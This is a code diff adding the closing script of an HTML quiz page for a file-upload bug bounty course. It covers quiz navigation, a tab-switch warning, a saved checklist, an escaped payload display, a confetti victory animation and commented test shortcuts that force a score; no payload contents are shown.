+  // Trigger Victory Animation
+  const maxScore = Q.length;
+  const isPerfect = score === maxScore;
+  const isGreat = score >= (maxScore * 0.8) && score < maxScore;
+  
+  if(isPerfect || isGreat){
+    playVictoryAnimation(score, maxScore);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  cheatPopupShown = false;
+  document.getElementById('cheatBanner').style.display = 'none';
+  document.getElementById('vic-overlay').classList.remove('show');
+  document.getElementById('vic-overlay').classList.remove('tier-perfect','tier-great');
+  
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('conceptView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 15 Questions';
+  renderQ();
+}
+
+function showKit(){
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('conceptView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+
+function showConcept(){
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('conceptView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept & Theory';
+}
+
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('conceptView').style.display='none';
+  if(cur < Q.length) {
+    document.getElementById('quizView').style.display='block';
+    document.getElementById('pageTitle').textContent='Concept Check — 15 Questions';
+  } else {
+    document.getElementById('doneView').style.display='block';
+    document.getElementById('pageTitle').textContent='Result';
+  }
+}
+
+// ==========================================
+// ANTI-CHEAT PROCTORING SYSTEM
+// ==========================================
+document.addEventListener('visibilitychange', function() {
+    if (!document.hidden) {
+        const quizView = document.getElementById('quizView');
+        if (quizView.style.display === 'block' && cur < Q.length) {
+            document.getElementById('cheatBanner').style.display = 'block';
+            if (!cheatPopupShown) {
+                showCheatWarning();
+                cheatPopupShown = true;
+            }
+        }
+    }
+});
+
+function showCheatWarning() {
+    document.getElementById('cheatModal').classList.add('show');
+}
+
+function closeCheatWarning() {
+    document.getElementById('cheatModal').classList.remove('show');
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('file_upload_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('file_upload_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${esc(item.code)}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+
+// ==========================================
+// VICTORY ANIMATION ENGINE
+// ==========================================
+let vicSparkleInterval = null;
+
+function playVictoryAnimation(finalScore, maxScore){
+  const overlay = document.getElementById('vic-overlay');
+  const stage = document.getElementById('vic-stage');
+
+  const isPerfect = finalScore === maxScore;
+  const isGreat   = finalScore >= (maxScore * 0.8) && finalScore < maxScore;
+
+  stage.querySelectorAll('.vic-star, .vic-confetti, .vic-sparkle').forEach(el => el.remove());
+  overlay.classList.remove('tier-perfect','tier-great');
+  overlay.classList.add(isPerfect ? 'tier-perfect' : 'tier-great');
+
+  document.getElementById('vic-score-num').textContent = '0';
+  document.getElementById('vic-score-label').textContent = 'Final Score  ·  out of ' + maxScore;
+
+  const headlineEl = document.getElementById('vic-headline');
+  const sublineEl  = document.getElementById('vic-subline');
+  if(isPerfect){
+    headlineEl.textContent = 'You Won!';
+    sublineEl.textContent  = 'Quiz complete — brilliant work';
+  } else {
+    headlineEl.textContent = 'Well Done!';
+    sublineEl.textContent  = `You got ${finalScore} out of ${maxScore} — solid work`;
+  }
+
+  overlay.classList.add('show');
+
+  const starCount = isPerfect ? 45 : 24;
+  for(let i=0;i<starCount;i++){
+    const s = document.createElement('div');
+    s.className = 'vic-star';
+    s.style.left = Math.random()*100 + '%';
+    s.style.top = Math.random()*100 + '%';
+    s.style.animationDelay = (Math.random()*3) + 's';
+    stage.appendChild(s);
+  }
+
+  const colorsPerfect = ['#ffc95c', '#ff6f91', '#6fe3c9', '#ffffff', '#f5a623'];
+  const colorsGreat   = ['#00d4ff', '#80e5ff', '#ffffff'];
+  const colors = isPerfect ? colorsPerfect : colorsGreat;
+  const confettiCount = isPerfect ? 90 : 28;
+
+  for(let i=0;i<confettiCount;i++){
+    const c = document.createElement('div');
+    c.className = 'vic-confetti';
+    const size = 6 + Math.random()*7;
+    const isCircle = Math.random() > 0.6;
+    c.style.width = size + 'px';
+    c.style.height = (isCircle ? size : size*2.2) + 'px';
+    c.style.borderRadius = isCircle ? '50%' : '2px';
+    c.style.background = colors[Math.floor(Math.random()*colors.length)];
+    c.style.left = Math.random()*100 + '%';
+    c.style.animationDuration = (3 + Math.random()*2.5) + 's';
+    c.style.animationDelay = (Math.random()*1.6) + 's';
+    c.style.opacity = isPerfect ? 0.95 : 0.6;
+    c.style.setProperty('--drift', (Math.random()*200-100) + 'px');
+    c.style.setProperty('--spin', (Math.random()*720-360) + 'deg');
+    stage.appendChild(c);
+  }
+
+  function sparkleSVG(){
+    return '<svg viewBox="0 0 24 24" fill="none"><path d="M12 0 L14 10 L24 12 L14 14 L12 24 L10 14 L0 12 L10 10 Z" fill="#fff7e2"/></svg>';
+  }
+  function spawnSparkles(count){
+    const rect = stage.getBoundingClientRect();
+    const cx = rect.width/2, cy = rect.height*0.36;
+    for(let i=0;i<count;i++){
+      const sp = document.createElement('div');
+      sp.className = 'vic-sparkle';
+      const angle = Math.random()*Math.PI*2;
+      const dist = 70 + Math.random()*90;
+      sp.style.left = (cx + Math.cos(angle)*dist) + 'px';
+      sp.style.top = (cy + Math.sin(angle)*dist) + 'px';
+      sp.style.animationDelay = (Math.random()*0.3) + 's';
+      sp.innerHTML = sparkleSVG();
+      stage.appendChild(sp);
+      setTimeout(()=> sp.remove(), 1800);
+    }
+  }
+  if(vicSparkleInterval) clearInterval(vicSparkleInterval);
+  if(isPerfect){
+    setTimeout(()=> spawnSparkles(6), 1200);
+    vicSparkleInterval = setInterval(()=> spawnSparkles(6), 1800);
+    setTimeout(()=> clearInterval(vicSparkleInterval), 12000);
+  } else {
+    setTimeout(()=> spawnSparkles(3), 1200);
+  }
+
+  const scoreEl = document.getElementById('vic-score-num');
+  setTimeout(()=>{
+    const duration = 1200;
+    const start = performance.now();
+    function step(now){
+      const progress = Math.min((now-start)/duration, 1);
+      const eased = 1 - Math.pow(1-progress, 3);
+      scoreEl.textContent = Math.round(eased * finalScore);
+      if(progress < 1) requestAnimationFrame(step);
+    }
+    requestAnimationFrame(step);
+  }, 1550);
+}
+
+document.getElementById('vic-continue-btn').addEventListener('click', ()=>{
+  document.getElementById('vic-overlay').classList.remove('show');
+  if(vicSparkleInterval) clearInterval(vicSparkleInterval);
+});
+
+// ==========================================
+// SECRET TEST SHORTCUTS
+//   testwin    -> forces a perfect 15/15
+//   testgreat  -> forces a 12/15
+// ==========================================
+(function(){
+  function activateTestScore(forcedScore, label){
+    score = forcedScore;
+    cur = Q.length;
+    finish();
+    showSecretToast(`✓ ${label} — score forced to ${forcedScore}/${Q.length}`);
+  }
+
+  function showSecretToast(msg){
+    const t = document.getElementById('vic-secret-toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(t._hideTimer);
+    t._hideTimer = setTimeout(()=> t.classList.remove('show'), 3000);
+  }
+
+  const CODES = {
+    'testwin':  15,
+    'testgreat':12
+  };
+  const maxLen = Math.max(...Object.keys(CODES).map(k=>k.length));
+  let buffer = '';
+
+  document.addEventListener('keydown', (e)=>{
+    if(e.key.length !== 1) return;
+    buffer = (buffer + e.key.toLowerCase()).slice(-maxLen);
+    for(const code in CODES){
+      if(buffer.endsWith(code)){
+        buffer = '';
+        activateTestScore(CODES[code], `Test code "${code}"`);
+        break;
+      }
+    }
+  });
+})();
+</script>
+</body>
+</html>
